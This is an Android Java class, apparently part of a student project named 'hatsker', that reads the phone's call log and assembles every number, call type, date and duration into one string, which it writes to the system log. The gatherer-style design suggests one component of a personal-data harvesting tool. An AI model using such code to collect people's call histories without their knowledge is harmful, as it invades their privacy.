package com.example.student.hatsker;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import java.security.Permission;
import java.util.Date;

/**
 * Created by Игорь on 25.07.2017.
 */

public class CallLogGatherer implements Gatherer {

    CallLogGatherer(Context context)
    {
        getInfo(context);
    }

    @Override
    public String getInfo(Context context) {
        StringBuffer stringBuffer = new StringBuffer();
        if(context.checkPermission(Manifest.permission.READ_CALL_LOG, 1, 1)==
                PackageManager.PERMISSION_GRANTED) {
            Cursor cursor = context.getContentResolver().query
                    (CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
            stringBuffer.append("Call Details :");
            while (cursor.moveToNext()) {
                String phNumber = cursor.getString(number);
                String callType = cursor.getString(type);
                String callDate = cursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = cursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
                stringBuffer.append("\n----------------------------------");
            }
            cursor.close();
        }
        else
        {
            Log.i("asd",stringBuffer.toString());
            stringBuffer.append("Permission denied");
        }

        Log.i("asd",stringBuffer.toString());
       return stringBuffer.toString();
    }
}
